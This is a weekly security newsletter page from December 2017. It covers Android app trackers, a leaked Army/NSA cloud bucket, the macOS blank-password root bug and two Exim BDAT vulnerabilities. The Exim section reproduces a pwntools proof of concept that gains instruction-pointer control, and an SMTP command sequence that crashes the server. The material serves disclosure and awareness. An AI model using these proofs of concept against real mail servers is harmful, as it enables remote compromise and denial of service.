.. include:: /pentest_links.txt


***********************************************************************
2017-12-02 Phone tracking, AWS leaks, macOS root, exim
***********************************************************************


Links and updates this week
===========================


DNS leak test
-------------

See `DNS leak test.com <https://www.dnsleaktest.com/>`_ for information on testing for DNS leaks.


Not getting hacked update
-------------------------

:ref:`not-getting-hacked` was updated to reflect a link to `Cybersecurity Campaign Playbook <https://www.belfercenter.org/cyberplaybook>`_.


Tracking via phone apps
-----------------------

From `Staggering Variety of Clandestine Trackers Found in Popular Android Apps <https://theintercept.com/2017/11/24/staggering-variety-of-clandestine-trackers-found-in-popular-android-apps/>`_:

  Researchers at Yale Privacy Lab and French nonprofit Exodus Privacy have documented the proliferation of tracking software on smartphones, finding that weather, flashlight, ride-sharing, and dating apps, among others, are infested with dozens of different types of trackers collecting vast amounts of information to better target advertising.

  Exodus security researchers `identified 44 trackers in more than 300 apps <https://exodus-privacy.eu.org/>`_ for Google’s Android smartphone operating system. The apps, collectively, have been downloaded billions of times. Yale Privacy Lab, within the university’s law school, is working to replicate the Exodus findings and has already `released reports <https://privacylab.yale.edu/>`_ on 25 of the trackers.

  Yale Privacy Lab researchers have only been able to analyze Android apps but believe many of the trackers also exist on iOS, since companies often distribute for both platforms. To find trackers, the Exodus researchers built a custom auditing platform for Android apps, which searched through the apps for digital “signatures” distilled from known trackers.

  Among the Android apps researchers identified were, with six or seven trackers each, dating apps Tinder and OkCupid, the Weather Channel app, and Super-Bright LED Flashlight; the app for digital music service Spotify, which embedded four trackers, including two from Google; ride-sharing service Uber, with three trackers; and Skype, Lyft, AccuWeather, and Microsoft Outlook.

See `Exodus Privacy <https://exodus-privacy.eu.org/>`_ for an overview of the `Exodus-Privacy/exodus <https://github.com/exodus-privacy/exodus>`_ tool and the Exodus Privacy French non-profit organization. They have a `Mastodon <https://joinmastodon.org/>`_ (see `Mastodon (software) <https://en.wikipedia.org/wiki/Mastodon_(software)>`_) presence at `Exodus Privacy Mastodon <https://framapiaf.org/@exodus>`_ with a link to `When the threats get weird, the security solutions get weirder <https://www.itworld.com/article/3239684/mobile-wireless/when-the-threats-get-weird-the-security-solutions-get-weirder.html>`_:

  Tracking is a real problem for mobile apps, and this problem is underappreciated in considerations around BYOD policies.

  Yale University Law School’s Privacy Lab and the France-based nonprofit Exodus Privacy have `documented <https://github.com/YalePrivacyLab/tracker-profiles>`_ that more than 75% of the more than 300 Android apps they looked at contained trackers of one kind or another, which mostly exist for advertising, behavioral analytics or location tracking.

  Most of that location tracking relies on accessing GPS information, which requires user opt-in. But now, researchers at Princeton University `have demonstrated <https://www.princeton.edu/news/2017/11/29/phones-vulnerable-location-tracking-even-when-gps-services>`_ a potential privacy breach by creating an app called PinMe, which harvests location information on a smartphone without using GPS information.

  In general, our belief that turning off the location feature of phones protected us from location snoops has been invalidated.

  In fact, many of our assumptions around security are being challenged by new facts. Take two-factor authentication, for example.

  A report last month by Javelin Strategy & Research claimed that current applications of multi-factor authentication are “being undermined.” Two- or multi-factor authentication is also underutilized by enterprises, with just over one-third using “two or more factors to secure access to their data and systems.”

  So we can’t trust two-factor authentication like we used to, and even if we could it’s wildly underutilized.

  But surely we can trust Apple devices, right? Apple has a sterling reputation for strong security. Or, I should say, “had” such a reputation.

The Exodus tool to find/analyze Android trackers is available at GitHub `Exodus-Privacy/exodus <https://github.com/exodus-privacy/exodus>`_. It was used by the `Yale Privacy Lab <https://privacylab.yale.edu/>`_ to create a report announced at `#BlackFriday Announcement from Privacy Lab <https://privacylab.yale.edu/press>`_. The detailed report is at `Yale Privacy Lab - Tracker Profiles <https://github.com/YalePrivacyLab/tracker-profiles>`_.

From the `#BlackFriday Announcement from Privacy Lab <https://privacylab.yale.edu/press>`_:

  More than 75% of the 300+ apps analyzed by Exodus contain the signatures of trackers, though this data does not tell the whole story. There is an entire industry based upon these trackers, and apps identified as “clean” today may contain trackers that have not yet been identified. Tracker code may also be added by developers to new versions of apps in the future. The Exodus platform identifies trackers via signatures, like an anti-virus or spyware scanner, and thus can only detect trackers previously identified by researchers at the time of the scan.

From the `Yale Privacy Lab - Surveillance Map <https://privacylab.yale.edu/surveillance-map>`_:

  Yale Privacy Lab is calling for transparency and public discussion concerning the steadily-increasing surveillance in our streets and near our homes, workplaces, and schools. This map is a starting point for conversation and action, focusing on Greater New Haven.


Classified AWS
-------------------------------

From `Announcing the New AWS Secret Region <https://aws.amazon.com/blogs/publicsector/announcing-the-new-aws-secret-region/>`_:

  With the launch of this new Secret Region, AWS becomes the first and only commercial cloud provider to offer regions to serve government workloads across the full range of data classifications, including Unclassified, Sensitive, Secret, and Top Secret.


Exploits this week
==================


Top Secret NSA and Army data leaked online
------------------------------------------

From `Black Box, Red Disk: How Top Secret NSA and Army Data Leaked Online <https://www.upguard.com/breaches/cloud-leak-inscom>`_:

  Critical data belonging to the United States `Army Intelligence and Security Command (INSCOM) <https://www.inscom.army.mil/>`_, a joint US Army and National Security Agency (NSA) Defense Department command tasked with gathering intelligence for US military and political leaders, leaked onto the public internet, exposing internal data and virtual systems used for classified communications to anyone with an internet connection. With `a middling CSTAR cyber risk score of 589 out of a maximum of 950 <https://app.upguard.com/webscan?url=https%3A%2F%2Fwww.inscom.army.mil%2F>`_, INSCOM’s web presence provides troubling indications of gaps in their cybersecurity - exemplified by the presence of classified data within this publicly accessible data repository.

  Among the most compelling downloadable assets revealed from within the exposed bucket is a virtual hard drive used for communications within secure federal IT environments, which, when opened, reveals classified data labeled `NOFORN <http://www.spiegel.de/international/world/glossary-of-nsa-abbreviations-a-975930.html>`_ - a restriction indicating a high level of sensitivity, prohibited from being disseminated even to foreign allies. The exposed data also reveals sensitive details concerning the Defense Department’s battlefield intelligence platform, `the Distributed Common Ground System - Army (DCGS-A) <http://asc.army.mil/web/portfolio-item/iews-dcgs-a/>`_ as well as `the platform’s troubled cloud auxiliary, codenamed “Red Disk.” <https://nypost.com/2014/10/27/army-spent-5b-on-failed-technology-created-by-vets/>`_

  This cloud leak follows a number of previous Cyber Risk Team reports detailing Pentagon data exposures from within `the US Central Command, US Pacific Command <https://www.upguard.com/breaches/cloud-leak-centcom>`_, and `the National Geospatial-Intelligence Agency <https://www.upguard.com/breaches/spy-games>`_, a Defense Department agency tasked with acquiring and analyzing satellite imagery intelligence. Such continual and apparently accidental exposure of classified national security data to the wider internet is proof that even the most secretive corners of the IT landscape are not immune to the cyber risks befalling any enterprise operating at scale.

Also see `Researcher discovers classified Army intel app, data on open public AWS bucket <https://arstechnica.com/information-technology/2017/11/army-red-disk-intel-sharing-system-left-exposed-in-open-aws-data-store/>`_.


macOS allows login as root
--------------------------

`CVE-2017-13872 <https://nvd.nist.gov/vuln/detail/CVE-2017-13872>`_ is a serious vulnerability that

  ... allows attackers to obtain administrator access without a password via certain interactions involving entry of the root user name.

From `Why <blank> Gets You Root <https://objective-see.com/blog/blog_0x24.html>`_:

  When a user (or attacker) attempts to log into an account that is not currently enabled (i.e. root), the system will create that account with whatever password the user specifies...even if that password is blank. Then the user (or attacker) can readily log into that account ...

Continuing on in the article, it was first posted on Nov 13, 2017:

  rather innocuously, to Apple's very own Developer Formums...in order to aid a user ...

  However, the flaw only gained wider public attention, when Lemi Orhan Ergin (`@lemiorhan <https://twitter.com/lemiorhan>`_) posted a **`tweet <https://twitter.com/lemiorhan/status/935578694541770752>`_** stating that, "we noticed a *HUGE* security issue at MacOS High Sierra...":

  Let's recap:

  * For accounts that are disabled (i.e. don't have 'shadowhash' data) macOS will attempt to perform an upgrade

  * During this upgrade, od_verify_crypt_password returns a non-zero value, and an error code which is not checked

  * The user (or attacked) specified password is then 'upgraded' and saved for the account

`About the security content of Security Update 2017-001 <https://support.apple.com/en-us/HT208315>`_ describes how to check that the patch has been applied.

From `Apple to audit development processes after Mac bug discovered <https://www.reuters.com/article/us-apple-cyber/apple-to-audit-development-processes-after-mac-bug-discovered-idUSKBN1DT2TJ>`_:

  Apple Inc (AAPL.O) said on Wednesday it would review its software development process a day after a researcher discovered a bug in a new version of its Mac operating system that could give hackers total control of vulnerable machines.


Exim RCE and DoS
----------------

Note: for details of SMTP BDAT see `RFC 3030`_ SMTP Service Extensions for Transmission of Large and Binary MIME Messages.

Note: from `Mail (MX) Server Survey <http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html>`_ Exim ran 56.64% of the 1,016,147 servers that were able to be fingerprinted. So bugs are a big deal.

There are 2 bugs resulting in 2 CVEs. From both `CVE-2017-16943 <https://nvd.nist.gov/vuln/detail/CVE-2017-16943>`_ and `CVE-2017-16944 <https://nvd.nist.gov/vuln/detail/CVE-2017-16944>`_:

  The receive_msg function in receive.c in the SMTP daemon in Exim 4.88 and 4.89 allows remote attackers to cause a denial of service (infinite loop and stack exhaustion) via vectors involving BDAT commands and an improper check for a '.' character signifying the end of the content, related to the bdat_getc function.

The first (RCE) bug was reported as `[exim-announce] Critical Exim Security Vulnerability: disable chunking <https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html>`_:

  A remote code execution vulnerability has been reported in Exim, with immediate public disclosure (we were given no private notice).

  With immediate effect, please apply this workaround: if you are running Exim 4.88 or newer (4.89 is current, 4.90 is upcoming) then in the main section of your Exim configuration, set:

    chunking_advertise_hosts =

  That's an empty value, nothing on the right of the equals. This disables advertising the ESMTP CHUNKING extension, making the BDAT verb unavailable and avoids letting an attacker apply the logic.

  This should be a complete workaround. Impact of applying the workaround is that mail senders have to stick to the traditional DATA verb instead of using BDAT.

This bug was reported publically via `Bug 2199 - Exim use-after-free vulnerability while reading mail header <https://bugs.exim.org/show_bug.cgi?id=2199>`_:

  Hi, we found a use-after-free vulnerability which is exploitable to RCE in the SMTP server.

  To trigger this bug, BDAT command is necessary to perform an allocation by raising an error. Through our research, we confirm that this vulnerability can be exploited to remote code execution if the binary is not compiled with PIE. 

  An RIP controlling PoC is in attachment poc.py. The following is the gdb result of this PoC:

    Program received signal SIGSEGV, Segmentation fault.
    0x00000000deadbeef in ?? ()
    (gdb)

  By the way, I want to apologize for accidentally making this bug public directly. I read SecurityReleaseProcess in wiki, googled and didn't find an email address to report. So I decided to report to this bugzilla and did not notice any option to set it private (and I thought maybe security issues are default to private). Anyway, I see the notification in report process now. Sorry for that.

  The notification is new, part of "lessons learned".  You didn't miss it, I added it in reaction to this incident.

  We should have had something clearer up before.  We didn't.  Shit happens, we pick ourselves back up, learn from it, fix things and move on.
 
The attached PoC is:

.. code-block:: python

  # pip install pwntools
  from pwn import *

  r = remote('localhost', 25)

  r.recvline()
  r.sendline("EHLO test")
  r.recvuntil("250 HELP")
  r.sendline("MAIL FROM:<test@localhost>")
  r.recvline()
  r.sendline("RCPT TO:<test@localhost>")
  r.recvline()
  #raw_input()
  r.sendline('a'*0x1100+'\x7f')
  #raw_input()
  r.recvuntil('command')
  r.sendline('BDAT 1')
  r.sendline(':BDAT \x7f')
  s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
  r.send(s+ ':\r\n')
  r.recvuntil('command')
  #raw_input()
  r.send('\n')
  r.interactive()
  exit()

The second (DoS) bug was reported as `Bug 2201 - Exim handles BDAT data incorrectly and leads to crash <https://bugs.exim.org/show_bug.cgi?id=2201>`_:

  While parsing BDAT data header, exim still scans for '.' and consider it the end of mail.

    https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867

  Exim goes into an incorrect state after this message is sent because the function pointer receive_getc is not reset. If the following command is also a BDAT, receive_getc and lwr_receive_getc become the same and an infinite loop occurs inside bdat_getc. Program crashes due to running out of stack.

    https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547

  Here is a simple PoC which leads to an infinite loop and program crash:

  .. code-block:: text

    ```
    EHLO localhost
    MAIL FROM:<test@localhost>
    RCPT TO:<test@localhost>
    BDAT 10
    .
    BDAT 0
    ```
